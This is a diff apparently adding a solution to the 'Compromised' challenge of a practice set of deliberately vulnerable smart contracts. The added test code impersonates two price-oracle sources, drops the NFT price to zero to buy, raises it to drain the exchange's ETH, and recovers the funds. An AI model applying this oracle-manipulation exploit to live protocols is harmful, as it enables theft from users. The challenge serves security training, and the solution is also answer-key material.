@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {CompromisedExploit} from "./CompromisedExploit.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -71,11 +72,30 @@ contract CompromisedChallenge is Test {
         assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
     }
 
+
+    function setPrice(uint price) internal {
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0],price);
+        vm.stopPrank();
+        
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0],price);
+        vm.stopPrank();
+    }
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+
+        CompromisedExploit exploit = new CompromisedExploit{value:address(this).balance}(oracle, exchange, nft, recovery);
+
+        setPrice(0);
+        exploit.buy();
         
+        setPrice(EXCHANGE_INITIAL_ETH_BALANCE);
+        exploit.sell();
+
+        exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
